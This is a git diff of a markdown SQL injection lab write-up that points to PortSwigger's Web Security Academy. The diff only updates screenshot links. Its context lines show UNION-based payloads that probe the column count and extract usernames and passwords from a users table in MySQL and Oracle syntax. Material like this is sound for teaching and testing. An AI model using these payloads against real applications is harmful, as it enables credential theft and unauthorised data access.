@@ -48,7 +48,7 @@ An error occurs when the specified column index exceeds the actual column count.
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
 ```
-![SQL Injection Lab](SQL_injection/Lab_01.png)
+![SQL Injection Lab](https://github.com/secgirl-victoria/SQL_Injection/blob/main/Lab_01.png)
 If the number of `NULL` values is incorrect, an error occurs. When correct, an additional row is displayed.
 
 **Note:** On Oracle databases, `DUAL` is required:
@@ -74,6 +74,7 @@ Once column count and data types are known, attackers can retrieve data:
 ```sql
 ' UNION SELECT username, password FROM users--
 ```
+![SQL Injection Lab](https://github.com/secgirl-victoria/SQL_Injection/blob/main/Lab_02.png)
 
 #### **Handling Single Column Output**
 If only one column is returned, values can be concatenated:
@@ -81,6 +82,7 @@ If only one column is returned, values can be concatenated:
 ' UNION SELECT username || '~' || password FROM users--  -- Oracle
 ' UNION SELECT CONCAT(username, ':', password) FROM users--  -- MySQL
 ```
+![SQL Injection Lab](https://github.com/secgirl-victoria/SQL_Injection/blob/main/Lab_03.png)
 
 ## 🎯 References
 - [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)
